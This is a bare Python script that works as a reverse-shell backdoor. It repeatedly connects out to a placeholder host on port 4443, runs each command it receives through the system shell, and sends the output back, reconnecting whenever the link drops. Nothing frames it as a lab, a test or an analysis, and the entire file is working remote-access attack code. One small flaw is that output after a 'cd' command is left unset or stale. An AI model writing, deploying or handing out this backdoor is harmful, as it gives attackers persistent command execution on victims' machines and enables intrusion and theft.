import socket
import os
import subprocess
import time

def connect():
    while True:
        try:
            s = socket.socket()
            host = '<IP>'
            port = 4443
            s.connect((host, port))
            return s
        except Exception as e:
            time.sleep(5)

s = connect()

while True:
    try:
        data = s.recv(1024)
        if not data:
            raise ConnectionResetError
        if len(data) > 0:
            cmd = data[:].decode("utf-8")
            
            if cmd.startswith('cd'):
                _, directory = cmd.split(' ', 1)
                os.chdir(directory.strip())
            else:
                cmd_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd_process.stdout.read() + cmd_process.stderr.read()
                output_str = str(output_byte, "utf-8", errors='ignore')
                
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
    except ConnectionResetError as e:
        s.close()
        s = connect()
    except Exception as e:
        s.close()
        s = connect()